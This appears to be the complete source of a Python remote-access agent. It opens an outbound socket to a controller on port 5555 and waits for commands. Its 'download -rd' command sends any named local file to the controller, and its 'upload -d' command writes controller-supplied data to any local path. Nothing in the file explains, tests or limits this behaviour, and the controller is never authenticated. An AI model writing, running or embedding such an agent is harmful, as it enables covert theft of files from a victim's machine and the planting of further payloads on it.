import socket
import os

def receive_file(client_socket, filename):
    with open(filename, 'wb') as f:
        while True:
            data = client_socket.recv(1024)
            if data.endswith(b"<<EOF>>"):
                f.write(data[:-7])
                break
            f.write(data)

def send_file(client_socket, filename):
    if not os.path.exists(filename):
        client_socket.sendall(b"ERROR: File not found.")
        return
    with open(filename, 'rb') as f:
        while True:
            data = f.read(1024)
            if not data:
                break
            client_socket.sendall(data)
    client_socket.sendall(b"<<EOF>>")

def main():
    HOST = '0.0.0.0'
    PORT = 5555
    s = socket.socket()
    s.connect((HOST, PORT))

    while True:
        command = s.recv(1024).decode()
        if command.startswith("upload"):
            parts = command.split()
            if len(parts) >= 3 and parts[1] == "-d":
                dest_path = parts[2]
                receive_file(s, dest_path)
                s.send(b"[+] File received.")
            else:
                s.send(b"[!] Invalid upload command.")
        elif command.startswith("download"):
            parts = command.split()
            if len(parts) >= 3 and parts[1] == "-rd":
                filepath = parts[2]
                send_file(s, filepath)
            else:
                s.send(b"[!] Invalid download command.")
        elif command == "exit":
            break

    s.close()

if __name__ == '__main__':
    main()
